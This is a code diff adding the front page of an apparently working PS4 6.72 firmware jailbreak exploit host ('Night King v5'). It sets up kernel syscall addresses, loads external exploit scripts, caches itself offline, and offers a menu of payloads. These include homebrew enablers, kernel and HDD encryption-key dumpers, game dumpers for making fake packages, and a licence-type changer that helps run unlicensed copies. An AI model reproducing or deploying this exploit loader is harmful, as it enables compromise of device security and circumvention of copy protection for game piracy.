eport_create_addr=sys_580_addr;var socket_addr=sys_97_addr;var _umtx_lock_addr=sys_434_addr;var thr_suspend_addr=sys_442_addr;var is_in_sandbox_addr=sys_585_addr;var get_authinfo_addr=sys_587_addr;var mdbg_service_addr=sys_601_addr;var getsockopt_addr=sys_118_addr;var get_paging_stats_of_all_threads_addr=sys_611_addr;var adjtime_addr=sys_140_addr;var kqueueex_addr=sys_141_addr;var uuidgen_addr=sys_392_addr;var set_vm_container_addr=sys_559_addr;var sendto_addr=sys_133_addr;
+ </script>
+ <script src="jb3.js"></script>
+ <script src="jb2.js"></script>
+ <script src="jb.js"></script>
+ <script>
+  window.applicationCache.ondownloading=function(){document.getElementById("msgs2").innerHTML="Page Caching Started!!"};
+  window.applicationCache.onprogress=function(a){document.getElementById("msgs2").innerHTML="Caching Status: "+(Math.round(100*(a.loaded/a.total)))+"% Completed"};
+  window.applicationCache.oncached=function(){document.getElementById("msgs2").innerHTML="Page Cached Successfully!!";setTimeout(function(){document.getElementById("msgs2").innerHTML="Turn Off the Internet & Reopen the Browser!!"; }, 1500);};
+  window.applicationCache.onnoupdate=function(){setTimeout(function(){load_JB(); }, 1500);};
+  window.applicationCache.onerror=function(){setTimeout(function(){load_JB(); }, 1500);};
+
+ </script>
+</head>
+<body id="body">
+ <div id="app"><!-- app start -->
+ 
+	 
+ <canvas v-show="isAnimate1Show" id=c></canvas>
+ 
+ <nav class="transparent" ><!-- navbar start -->
+  <div class="nav-wrapper">
+   <a href="javascript:void(0)" class="brand-logo left" style="text-shadow: 4px 4px 4px black;">NIGHT KING v5 - 6.72 FW Manual</a> 
+ 
+   <ul id="nav-mobile" class="right"><!-- navbar links -->
+   <li class="waves-effect waves-light" v-if="lang!=='fa'" @click="changeLang('fa')"><a>فارسی</a></li>
+    <li class="waves-effect waves-light" v-if="lang!=='eng'" @click="changeLang('eng')"><a>English</a></li>
+    <li class="waves-effect waves-light" v-if="!isPayloadShow" @click="showMain"><a>{{changeText("صفحه اصلی","Main Page")}}</a></li>
+    <li class="waves-effect waves-light" v-if="!isThemesShow" @click="showTheme"><a>{{changeText("تم ها","Themes")}}</a></li>
+    <li class="waves-effect waves-light" v-if="!isAboutUsShow" @click="showAboutUs"><a>{{changeText("درباره ما","About Us")}}</a></li>
+	<li class="waves-effect waves-light" v-if="!isDonationShow" @click="showDonation"><a>{{changeText("حمایت از نایت کینگ","Donation")}}</a></li>
+   </ul>
+	  
+  </div>
+ </nav><!-- navbar end -->
+
+  
+  <div class="loader" v-if="isLoaderShow">
+   <a  class="button" style="color: green;text-shadow: 4px 4px 4px black; font-weight: bold;">Pass = <span id=passCounter></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+
+  <span id="msgs2" style="text-shadow: 4px 4px 4px black;">
+    {{changeText("Status","Status","")}}
+   </span>   
+   <span id="temp" >
+    <input type="range" id="tempC" min="40" @change="temp=tempC.value" value="60" step="1" max="79" />
+    <span class="tempVal" >{{temp+"&#176;C"}}</span>
+    <button @click="setTemp()">{{changeText("تنظیم","Set")}}</button>
+   </span>
+   <a  class="button2" style="color: red;text-shadow: 4px 4px 4px black; font-weight: bold;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fail = <span id=failCounter></span> </a>    
+   <span id="date" ></span>
+   <span id="clock" ></span>
+  </div>
+  
+  <div id="payloads" class="payloads" v-show="isPayloadShow"><!-- payloads list start -->
+   <div v-for="payload,key in payloads" @click="loadPlayload(key)" @mouseover="hover(key)" @mouseleave="hover()" class="tile">
+    <img :src="''+payload.icon" >
+    <p class="white-text" >{{payload.name}}</p>
+   </div>   
+  </div><!-- payloads list end -->
+
+  <div id="gta" class="payloads" v-show="isGtaShow"><!-- gta payloads list start -->
+  
+    <div class="tile" @mouseover="Backhover()" @mouseleave="hover()" @click="showMain()">
+     <img src="icons/back_to_main_menu.png" >
+     <p class="white-text" >{{changeText("بازگشت به منو","Back To Menu")}}</p>
+    </div>
+    
+    <div v-for="payload,key in GTA" @click="loadPlayload('gta'+key)" @mouseover="hover('gta'+key)" @mouseleave="hover()" class="tile">
+     <img :src="''+payload.icon" >
+     <p class="white-text" >{{payload.name}}</p>
+    </div>   
+   </div><!-- gta payloads list end -->
+
+   <div id="dum" class="payloads" v-show="isDumperShow"><!-- Dumper payloads list start -->
+  
+    <div class="tile" @mouseover="Backhover()" @mouseleave="hover()" @click="showMain()">
+     <img src="icons/back_to_main_menu.png" >
+     <p class="white-text" >{{changeText("بازگشت به منو","Back To Menu")}}</p>
+    </div>
+    
+    <div v-for="payload,key in DUMPER" @click="loadPlayload('dum'+key)" @mouseover="hover('dum'+key)" @mouseleave="hover()" class="tile">
+     <img :src="''+payload.icon" >
+     <p class="white-text" >{{payload.name}}</p>
+    </div>   
+   </div><!-- Dumper payloads list end -->
+
+
+
+  <div id="detail" class="detail" v-show="isDetailShow" :style="lang=='eng' ? 'direction:ltr;text-align:left;float:left;' : 'direction:rtl;text-align:right;float:right;' " ><!-- tozihat-->
+
+  </div>
+
+    <div class="theme" v-show="isThemesShow"><!-- themes start -->
+    
+    <div class="card" v-for="theme,key in themes" @click="changeTheme(key)">
+     <div class="card-image">
+      <img :src="''+theme.url">
+     </div>
+     <div class="card-action waves-effect waves-light" style="width:100%" >
+      <div class="center" :class="{ 'green-text': theme.selected, 'white-text': !theme.selected}">{{theme.selected ? changeText("انتخاب شده","Selected") : changeText("انتخاب","Select") }}</div>
+     </div>
+    </div>
+
+  </div><!-- themes end -->
+  
+  <div class="Donation"  v-show="isDonationShow" :dir="changeText('rtl','ltr')" ><!-- Donation start -->
+    <h4><b>{{changeText("حمایت از نایت کینگ","Donation")}}</b></h4>
+    <p>{{changeText("جهت حمایت از نایت کینگ می توانید از طریق لینک زیر اقدام نمایید","To support us, follow the link below")}} :</p>
+      <p style="color:red;"> 💳 <a href="https://idpay.ir/night-king" target="_blank"> ID-Pay (Iran) Night-King </a> 💳 </p>
+	  <p style="color:red;"> 💳 <a > Bitcoin Wallet [ Night King ] :  1MZ6T8rPr4xxJKJhdXD1ifAQZVxj3H1QNu </a> 💳 </p>
+   </div><!-- Donation end -->
+
+  
+   <div class="aboutUs"  v-show="isAboutUsShow" :dir="changeText('rtl','ltr')" ><!-- about us start -->
+    <h4><b>{{changeText("درباره ما","About Us","")}}</b></h4>
+    <p>{{changeText("نایت کینگ نسخه 5 برای فریمور 6.72 کنسول ps4","NIGHT KING v5 - For PS4 6.72 FW")}}</p>
+    <p>{{changeText("تشکر ویژه از امیرحسین کیان فرد ، سیسترو ، اسلیرزگوی ، کاملئون و هوپرز","Special thanks to Amir Hossein Kianfard , Sistro , Sleirsgoevy , Kameleon RE And Hoppers")}}</p>
+	<p>{{changeText("طراح هاست : SALT - با ما از طریق تلگرام در ارتباط باشید ","Host Designer : SALT - Find Us In Telegram",)}}📞 <a href=https://t.me/Salt753194>@Salt753194</a> 📞,</p>
+   	<p>{{changeText("یا توییتر : ","Or Twitter : ",)}}📞 <a href=https://twitter.com/salt13939424>@Salt13939424</a> 📞,</p>
+    <p>{{changeText("آخرین بروزرسانی در تیر 1400","Last Update At July 2021")}}</p>
+   </div><!-- about us end -->
+   
+   
+  </div><!-- app end -->
+  
+  <div id="SALT" style="display:none">
+<div id="loaderp"><div id="txt0" class="txt1" >Loading Payload ...</div>
+<div class="AniGif" ><div id=ldbar class=Ani0></div></div>
+<div id="txt2" class="txt2" style="color:white;" >Payload for FW 6.72 BY SALT</div></div>
+<div id="done" style="display:none;color:white"><div class="txt1" >Payload Loaded <div id="Tick"></div>&nbsp;&nbsp;Press <div id="PSBUTTON"></div> to exit.</div><div class="container"><div class=AniDone ></div></div><div class="txt2" style="color:white;"></div></div>
+<div id="fail" style="display:none" class="txt1">Payload failed !<br>try again</div>
+ </div>
+  
+ <div id="SALTX" style="display:none">
+<div id="loaderx"><div id="txt1" class="txt1">Loading HEN ...</div>
+<div class="AniGif"><div id=ldbarx class=Ani1></div></div>
+<div class="txt2"><script>document.write("HEN for 6.72 FW BY SALT");</script></div></div>
+<div id="donex" style="display:none"><div class="txt1"><script>document.write("HEN");</script> Loaded <div id="Tick"></div>&nbsp;&nbsp;After run HEN Press Circle button to exit.</div><div class="container"><div class=AniDone></div></div><div class="txt2"><script>document.write("HEN for 6.72 FW BY SALT");</script></div></div>
+<div id="failx" style="display:none" class="txt1">Exploit failed !<br>Reboot and try again</div>
+</div>
+
+<div id="SALTM" style="display:none">
+<div id="loaderm"><div id="txtm" class="txt1">Loading Mira ...</div>
+<div class="AniGif"><div id=ldbarm class=Ani1></div></div>
+<div class="txt2"><script>document.write("Mira for 6.72 FW BY SALT");</script></div></div>
+<div id="donem" style="display:none"><div class="txt1"><script>document.write("Mira");</script> Loaded <div id="Tick"></div>&nbsp;&nbsp;After run Mira Press Circle button to exit.</div><div class="container"><div class=AniDone></div></div><div class="txt2"><script>document.write("Mira for 6.72 FW BY SALT");</script></div></div>
+<div id="failm" style="display:none" class="txt1">Exploit failed !<br>Reboot and try again</div>
+</div>
+
+  <!-- js section  -->
+ <script src="materialize.js"></script>
+ <script type="text/javascript">
+  if (localStorage.passcount == null) localStorage.passcount=0;
+window.passCounter.innerHTML=localStorage.passcount;
+if (localStorage.failcount == null) localStorage.failcount=0;
+window.failCounter.innerHTML=localStorage.failcount;
+
+ if(localStorage.getItem("theme")==null){
+  localStorage.setItem("theme",0)
+ }
+ if(localStorage.getItem("lang")==null){
+  localStorage.setItem("lang","eng")
+ }
+ </script>
+ <script src="vue.js"></script>
+ <script type="text/javascript">
+  var app = new Vue({
+   el: '#app',
+   data: {
+    isLoaderShow:true,
+    isPayloadShow:true,
+    isThemesShow:false,
+	isDonationShow:false,
+    isAboutUsShow:false,
+    isGtaShow:false,
+    isDumperShow:false,
+    isDetailShow:false,
+    isAnimate1Show:false,
+    lang:localStorage.getItem("lang"),
+    selectedTheme:localStorage.getItem("theme"),
+    payloads:[
+     {name:"Jailbreak",icon:"icons/jailbreak.png",eng_detail:"Only jailbreak! in order to run the games and Hombrews it is necessary to run Mira or Hen after running jailbreak. [ Suggested : GOLD HEN v1.1 By Sistro ]",fa_detail:"جیلبریک کنسول به تنهایی! بمنظور اجرای بازیها و هومبروها لازم است پس از انجام جیلبریک یکی از پیلودهای Mira و یا Hen را نیز اجرا نمایید. [ پیشنهادی : GOLD HEN v1.1 از سیسترو ]"},
+	 {name:"GOLD HEN 1.1",icon:"icons/hen.png",eng_detail:"GOLD HEN v1.1 By Sistro : Homebrew Enabler - Debug Settings - RPI - sys_dynlib_dlsym Patch - UART Enabler - Never Disable Screenshot - Remote Play Enabler - Persistent FTP on 2121 port (Rest Mode Support) - FW Update Block - VR , Rest Mode , External HDD , Official External HDD Format , Debug Trophies Support.",fa_detail:"گلد هن نسخه 1.1 از سیسترو : Homebrew Enabler - Debug Settings - RPI - sys_dynlib_dlsym Patch - UART Enabler - Never Disable Screenshot - Remote Play Enabler - Persistent FTP on 2121 port (Rest Mode Support) - FW Update Block - VR , Rest Mode , External HDD , Official External HDD Format , Debug Trophies Support"},
+	 {name:"HEN 2.1.3",icon:"icons/hen.png",eng_detail:"Hen v2.1.3 by SiSTRo : Debug settings - Remote PKG installer - UART Enabler - VR Support - Rest Mode Support - FW Version Spoof to 9.99 - Debug Trophies Support - Remote Play Enabler.",fa_detail:"Hen 2.1.3 به همراه اضافه شدن قابلیت فعالسازی همزمان Remote Play"},
+	 {name:"HEN 2.1.3b",icon:"icons/hen.png",eng_detail:"Hen v2.1.3b : Hen 2.1.3 + FW Version Spoof to 7.51,Rest Mode Support,Fix error debug setting.",fa_detail:"آپدیت هن 2.1.3 :اسپوف فریمور به 7.51  "},
+     {name:"Mira",icon:"icons/Mira.png",eng_detail:"By Mira you can Set of features like in a single payload . like homebrew enabler and ....",fa_detail:"بارگزاری میرا  : فعالسازی قابلیت امکان اجرای نرم افزارها و بازیهای fpkg"},
+	 {name:"Mira Unofficial",icon:"icons/Mira_Unofficial.png",eng_detail:"By Mira Unofficial you can Set of features like in a single payload . like homebrew enabler and ....",fa_detail:"بارگزاری میرا نسخه غیر رسمی: فعالسازی قابلیت امکان اجرای نرم افزارها و بازیهای fpkg"},
+     {name:"Orbis Toolbox",icon:"icons/Orbis_Toolbox.png",eng_detail:"Orbis Toolbox Loader Alpha Build 1167 - Add Extra Tools Option to Your PS4 Settings.",fa_detail:"بارگزاری Orbis Toolbox Loader Alpha Build 1167 - این پیلود یک آپشن سفارشی با امکانات بیشتر در قسمت تنظیمات کنسول شما اضافه خواهد کرد."},
+     {name:"Bin Loader",icon:"icons/binloader.png",eng_detail:"Loads a bin file sent to the PS4 IP address on port 9021.",fa_detail:"لودر فایل Bin از طریق پورت 9021"},
+	 {name:"FTP",icon:"icons/ftp.png",eng_detail:"A full access FTP server for the PS4 Connect your FTP client to the IP address that the popup message tells you. The FTP port number is 1337.",fa_detail:"ایجاد بستر ارتباطی لازم جهت اتصال کامپیوتر و کنسول ps4 شما توسط ftp بمنظور مدیریت فایلها"}, 
+	 {name:"App To USB",icon:"icons/app2usb.png",eng_detail:"Move installed games to an external USB drive. Put AppToUsb.ini in folder named PS4 on root of your USB drive.",fa_detail:"انتقال بازی های نصب شده از کنسول به حافظه خارجی با فرمت exfat"},
+	 {name:"History Blocker",icon:"icons/history_blocker.png",eng_detail:"Disable the auto opening of the last page used in the PS4 WebBrowser. Run the payload again to disable this feature.",fa_detail:"غیر فعالسازی بازکردن خودکار آخرین صفحه ای که در مرورگر PS4 شما استفاده شده است ، برای بازگشت به حالت نرمال مجددا این پیلود را ارسال کنید!"},
+     {name:"Disable Update",icon:"icons/disable_update.png",eng_detail:"Creates dummy files in the PS4 update folder to prevent the download of unwanted system updates. It also deletes any existing updates if they already exist. You only ever have to run this once !",fa_detail:"غیرفعال سازی آپدیت فریمور کنسول"},
+     {name:"Enable Update",icon:"icons/enable_update.png",eng_detail:"Removes the dummy files in the PS4 update folder to enable the download of updates again. Run this if you have previously disabled updates and wish to update your console.",fa_detail:"فعالسازی مجدد آپدیت فریمور کنسول"},
+     {name:"DB Backup",icon:"icons/backup.png",eng_detail:"Create a backup of important database files. A backup of your app databases will be created and saved internally on your PS4 HDD and also to USB if a USB drive is inserted.",fa_detail:"پشتیبان گیری از دیتابیس (کلیه بازی و هومبروهای نصب شده) به حافظه USB"},
+     {name:"DB Restore",icon:"icons/restore.png",eng_detail:"Restore a backup of the database files created by 'DB.Backup'",fa_detail:"بازگرداندن دیتابیس بکاپ تهیه شده از حافظه USB"},
+     {name:"Trophy Backup",icon:"icons/backup.png",eng_detail:"Create Trophy Backup files (All installed Games + Screenshots) to External USB Storage.",fa_detail:"پشتیبان گیری از فایلهای تروفی (کلیه بازیهای نصب شده) بهمراه اسکرین شاتها به حافظه USB"},
+	 {name:"Trophy Restore",icon:"icons/restore.png",eng_detail:"Restore Trophy Backup files (All installed Games + Screenshots) from External USB Storage to your Console.",fa_detail:"بازگرداندن فایلهای تروفی از قبل تهیه شده (کلیه بازیهای نصب شده) بهمراه اسکرین شاتها از حافظه USB به کنسول"},
+     {name:"RemotePlay",icon:"icons/remote.png",eng_detail:"PS4 Remote Play Enabler. Use this to allow you to register a device for remote play.",fa_detail:"فعالسازی قابلیت Remote Play بمنظور دریافت تصویر کنسول در کامپیوتر ، دستگاه اندرویدی و ..."},
+     {name:"ToDex",icon:"icons/Todex_Todev_Tokratos.png",eng_detail:"unlocks some debug features available on testkit like : Delete Patch - Delete Addcont Extra Data - Delete Temp Data - Delete Download Data - Delete Users' Save Data - Delete All Users' Save Data. not permanent, so you have to apply both mira and this payload to have it working.",fa_detail:"فعالسازی منوی دیباگ کنسول TestKit در قسمت Option هومبرو و بازیها"},
+     {name:"ToDev",icon:"icons/Todex_Todev_Tokratos.png",eng_detail:" that converts Target ID to 0x81 which is DevKit.",fa_detail:" اضافه شدن گزینه های کنسول devkit به کنسول retail شما"},
+     {name:"ToKratos",icon:"icons/Todex_Todev_Tokratos.png",eng_detail:"converts Target ID to 0xA0 which is Arcade or Kratos model.",fa_detail:"اضافه شدن گزینه های کنسول Arcade or Kratos model به کنسول retail شما."},
+     {name:"ps4 debug",icon:"icons/ps4_debug.png",eng_detail:"Save Data Mounter",fa_detail:"فعالسازی قابلیت کپی نمودن سیو بازیها در حافظه ی فلش یا هارد درایو با فرمت fat32 یا exfat"},
+	 {name:"Fake USB",icon:"icons/fake_usb.png",eng_detail:"To install .pkg files without a large enough USB drive, copy .pkg files to /user/home/fakeusb/ via FTP,then connect any USB drive and select FAKEUSB (with HEN already activated). Then go to debug settings and install the packages as uaual.",fa_detail:"نصب بازی از منوی debug settings با قابلیت کپی کردن فایلهای pkg به حافظه ی داخلی کنسول از طریق ftp سپس اتصال یک فلش مموری خالی و ارسال پیلود"},
+     {name:"Webrte",icon:"icons/Webrte.png",eng_detail:"Prerequisite for using online trainer from Ps4trainer.com website or offline trainer , Run this payload first and then start the game you wish to train.",fa_detail:"پیش نیاز جهت استفاده از ترینر بازیها بصورت آنلاین از سایت Ps4trainer.com یا بمنظور استفاده از ترینر آفلاین."},
+	 {name:"Fan Control",icon:"icons/fan.png",eng_detail:"Set the desired temperature that the PS4 fan starts. The value you set will remain until the power is removed from the PS4. The default PS4 setting is 79&#176;C",fa_detail:"تنظیم دمای دلخواه جهت چرخش بیشتر دور فن، که تا زمانی که برق کنسول قطع نشود فعال است. "},
+	 {name:"Spoofer",icon:"icons/spoofer.png",eng_detail:"Spoof your 6.72 Firmware to 9.99 Firmware, Used for VR games. After sending the payload , take the console to Rest Mode and then turn it on again for change your Firmware to 9.99.",fa_detail:"اسپوف فریمور 6.72 شما به فریمور 9.99 ، برای بازیهای VR کاربرد دارد. پس از ارسال پیلود برای تغییر فریمور به 9.99 کنسول خود را به حالت Rest Mode برده و مجددا روشن کنید."},
+	 {name:"EAP Key Dumper",icon:"icons/key_dumper.png",eng_detail:"Dump your EAP KEY to a USB drive - This is your PS4 HDD encryption key, you can use it to mount your PS4 HDD on your PC [ linux operating system ] and decrypt it.",fa_detail:"دامپ یا بکاپ از کلید EAP هارد کنسول شما در حافظه ی جانبی بصورت فایلی بنام eap_key.bin بمنظور رمزگشایی و دسترسی به هارد کنسول بروی سیستم عامل لینوکس در PC"},
+	 {name:"Linux USB Load",icon:"icons/linux.png",eng_detail:"A Linux Loader to run a Linux installation from USB. This will load Linux with 2GB Video Ram and 6GB System Ram.",fa_detail:"لودر مخصوص اجرای لینوکس از طریق درگاه USB با مقدار حافظه ی پیش فرض 2 گیگابایت جهت گرافیک"},
+     {name:"Linux Baikal",icon:"icons/linux.png",eng_detail:"Linux for baikal version",fa_detail:"لودر مخصوص لینوکس با پشتیبانی از چیپ Baikal."},
+     {name:"Linux Internal",icon:"icons/linux.png",eng_detail:"Boot Linux from internal HDD",fa_detail:"لودر مخصوص اجرای لینوکس از طریق  HDD داخلی."},
+     {name:"Rif Renamer",icon:"icons/rif_renamer.png",eng_detail:"Rif Renamer v1 By AIAzif - Changes the installed games Licence type from FAKE to FREE - Use this to fix games that will not work with regular HEN if you originally installed games using MiraHen you might have this problem.",fa_detail:"تغییر لایسنس بازیهای نصب شده که با ارسال پیلود Hen قفل آنها باز نمیشود (بدلیل نصب بازی با MiraHen) - پس از ارسال این پیلود مشکل مذکور برطرف خواهد شد!"},
+     {name:"Dumper",icon:"icons/dumper.png",eng_detail:"Dumper Paloads for Dump The Games , Hombrews & Kernel",fa_detail:"پیلودهای دامپر بمنظور دامپ بازیها ، هومبروها و کرنل"},
+	 {name:"GTA V & RDR2",icon:"icons/Rockstar_Trainers.png",eng_detail:"Grand Theft Auto V And Red Dead Redemption 2 Trainers",fa_detail:"ترینهای بازی Grand Theft Auto V و Red Dead Redemption 2"},
+     
+	 {name:"Web Activator",icon:"icons/Web_Activitore.png",eng_detail:"PS4 Offline Account Activator is a Web payload to activate your PSN accounts on Jailbroken PS4 for Exporting save data to USB with exfat format , Active Remote Play Option and … ! After send gold hen or any version of hen you can send this payload , If the page does not load, Reopen host and try again Until web activitor load successfully.",fa_detail:"برای اکتیو کردن حساب PSN شما بمنظور فعالسازی قابلیت Remote Play ، کپی کردن فایل سیو بازیها در حافظه ی usb با فرمت exfat و ... ! پس از ارسال gold hen یا hen مورد نظرتان web activitor را ارسال کنید ، در صورت بارگزاری نشدن صفحه ، هاست را باز و بسته کرده و مجدد web activitor را فرستاده تا صفحه ی آن بارگزاری شود."},
+	 {name:"Offline Trainer",icon:"icons/Offline_Trainer.png",eng_detail:"PS4 OFFLINE TRAINER Cache BY Kameleon Dev + NIGHT KING HOST Together. ",fa_detail:"ذخیره سازی ترینر ( کد تقلب بازیها ) بصورت آفلاین از دولوپر کاملئون + هاست نایت کینگ با هم."},
+	],
+
+    GTA:[
+     {name:"ArabicGuy 1.00",icon:"icons/GTAV.png",eng_detail:"Active Arabic Guy Trainer for Grand Theft Auto V Game Version 1.00 - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press R1+L1",fa_detail:"فعالسازی ترینر Arabic Guy برای بازی Grand Theft Auto V نسخه 1.00 - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان L1+R1 را بفشارید."},
+	 {name:"ArabicGuy 1.27",icon:"icons/GTAV.png",eng_detail:"Active Arabic Guy Trainer for Grand Theft Auto V Game Version 1.27 - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press Right+Square",fa_detail:"فعالسازی ترینر Arabic Guy برای بازی Grand Theft Auto V نسخه 1.27 - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان راست+مربع را بفشارید."},	
+     {name:"ArabicGuy 1.32",icon:"icons/GTAV.png",eng_detail:"Active Arabic Guy Trainer for Grand Theft Auto V Game Version 1.32 - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press Right+Square",fa_detail:"فعالسازی ترینر Arabic Guy برای بازی Grand Theft Auto V نسخه 1.32 - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان راست+مربع را بفشارید."},
+	 {name:"Lamance 1.32",icon:"icons/GTAV.png",eng_detail:"Active Lamance Trainer for Grand Theft Auto V Game Version 1.32 - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press Right+Square",fa_detail:"فعالسازی ترینر Lamance برای بازی Grand Theft Auto V نسخه 1.32 - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان راست+مربع را بفشارید."},
+     {name:"BeefQueef 1.32",icon:"icons/GTAV.png",eng_detail:"Active BeefQueef Trainer for Grand Theft Auto V Game Version 1.32 - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press Right+Square",fa_detail:"فعالسازی ترینر BeefQueef برای بازی Grand Theft Auto V نسخه 1.32 - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان راست+مربع را بفشارید."},	 
+	 {name:"BeefQueef 1.33",icon:"icons/GTAV.png",eng_detail:"Active BeefQueef Trainer for Grand Theft Auto V Game Version 1.33 - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press Right+Square",fa_detail:"فعالسازی ترینر BeefQueef برای بازی Grand Theft Auto V نسخه 1.33 - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان راست+مربع را بفشارید."},	 
+     {name:"RDR2 V1.13",icon:"icons/RDR2.png",eng_detail:"Active Red Dead Redemption 2 Trainer free version For the European region [ CUSA08519 ] Update v1.13 from rfoodxmodz - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press R1+Square",fa_detail:"فعالسازی ترینر Red Dead Redemption 2 نسخه ی رایگان برای ریجن اروپا ، تایتل آیدی CUSA08519 آپدیت 1.13 از rfoodxmodz - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان R1+مربع را بفشارید."},
+	 {name:"RDR2 V1.19",icon:"icons/RDR2.png",eng_detail:"Active Red Dead Redemption 2 Trainer free version For the European region [ CUSA08519 ] Update v1.19 from rfoodxmodz - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press R1+Square",fa_detail:"فعالسازی ترینر Red Dead Redemption 2 نسخه ی رایگان برای ریجن اروپا ، تایتل آیدی CUSA08519 آپدیت 1.19 از rfoodxmodz - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان R1+مربع را بفشارید."},
+     {name:"RDR2 V1.24",icon:"icons/RDR2.png",eng_detail:"Active Red Dead Redemption 2 Trainer free version For the European region [ CUSA08519 ] Update v1.24 from rfoodxmodz - Send Payload --> Press PS Button --> Launch The Game --> IN The Game Press R1+Square",fa_detail:"فعالسازی ترینر Red Dead Redemption 2 نسخه ی رایگان برای ریجن اروپا ، تایتل آیدی CUSA08519 آپدیت 1.24 از rfoodxmodz - پس از ارسال پیلود دکمه ی PS را فشرده ، بازی را اجرا کرده و در بازی همزمان R1+مربع را بفشارید."},
+    ],
+   
+    DUMPER:[
+     {name:"Game Dumper",icon:"icons/dumper.png",eng_detail:"Dump your Games to a USB drive to be able to create fpkg files.",fa_detail:"توسط این پی لود امکان تهیه دامپ یا بکاپ از دیسک بازی در کنسول فراهم می گردد."},
+     {name:"Update Dumper",icon:"icons/dumper.png",eng_detail:"Dump your Games Update to a USB drive to be able to create fpkg files.",fa_detail:"توسط این پی لود امکان تهیه دامپ یا بکاپ از آپدیت بازی در کنسول فراهم می گردد."},
+     {name:"G+U Dumper",icon:"icons/dumper.png",eng_detail:"Dump your Games + Update  to a USB drive to be able to create fpkg files.",fa_detail:"توسط این پی لود امکان تهیه دامپ یا بکاپ از دیسک بازی و آپدیت بازی در کنسول فراهم می گردد."},
+     {name:"G+U.M Dumper",icon:"icons/dumper.png",eng_detail:"Dump your Games + Update merge to a USB drive to be able to create fpkg files.",fa_detail:"توسط این پی لود امکان تهیه دامپ یا بکاپ از دیسک بازی و آپدیت بازی بصورت ادغام در کنسول فراهم می گردد."},
+     {name:"Kernel Dumper",icon:"icons/kernel_dumper.png",eng_detail:"Dump a copy of your kernel to your USB drive. Your kernel will be dumped to: KernelDump.bin on your USB drive.",fa_detail:"تهیه ی نسخه ی کپی از کرنل کنسول شما در حافظه ی جانبی با فرمت xfat یا fat32 بصورت فایلی با نام KernelDump.bin."},
+	],
+    themes:[
+	{url:"1.jpg",animated:false,selected:false},
+    {url:"2.jpg",animated:false,selected:false},
+	{url:"3.jpg",animated:false,selected:false},
+    {url:"4.jpg",animated:false,selected:false},
+	{url:"5.jpg",animated:false,selected:false},
+    {url:"6.jpg",animated:false,selected:false},
+	{url:"7.jpg",animated:false,selected:false},
+    {url:"8.jpg",animated:false,selected:false},
+	{url:"9.jpg",animated:false,selected:false},
+	{url:"10.jpg",animated:false,selected:false},
+    ],
+    temp:tempC.value
+   },
+   methods:{
+    loadPlayload: function(key){
+	 if(key==0){//load Jailbreak
+     msgs2.innerHTML="<div>Jailbreaking ...</div>";  setTimeout(parent.jailbreakx,500);}
+	 if(key==1){//load GOLD HEN v1.1
+	 PLfile="goldhen_1.1_672.bin";
+     SALTX.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt1.innerHTML="<div>Loading GOLD HEN v1.1 ...</div>";  setTimeout(parent.jailbreak,500);}
+     if(key==2){//load HEN 2.1.3
+	 PLfile="hen213.bin";
+	 SALTX.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none'; txt1.innerHTML="<div>Loading HEN 2.1.3 ...</div>"; setTimeout(parent.jailbreak,500);
+       }
+     if(key==3){//load HEN 2.1.3b
+	 PLfile="hen213b.bin";
+     SALTX.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt1.innerHTML="<div>Loading HEN 2.1.3b ...</div>";  setTimeout(parent.jailbreak,500);}
+	 if(key==4){//load mira 
+	 PLfile="pl_mira.js";
+	 SALTM.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txtm.innerHTML="<div>Loading Mira ...</div>";    setTimeout(parent.jailbreakm,500);}
+	 if(key==5){//load mira Unofficial
+	 PLfile="pl_mira_unofficial.js";
+	 SALTM.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txtm.innerHTML="<div>Loading Mira Unofficial ...</div>"; setTimeout(parent.jailbreakm,500);}
+	 if(key==6){//load Orbis Toolbox
+	 PLfile="pl_Orbis_Toolbox.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading Orbis Toolbox ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==7){//load binloader
+	 PLfile="binLoader.bin";
+     txt0.innerHTML="<div>Binloader Loading...</div>"; txt2.innerHTML="After Load, Send Payload To Port 9021"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+    
+     if(key==8){//load ftp
+	 PLfile="pl_FTP.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading FTP ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==9){//load app2usb
+	 PLfile="pl_app2usb.bin";
+     SALT.style.display = 'block';payloads.style.display = 'none';detail.style.display = 'none';txt0.innerHTML="<div>Loading APP2USB ...</div>"; var script = document.createElement('script');script.src = "exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);}
+	 if(key==10){//load historyblock
+	 PLfile="pl_historyBlocker.bin";
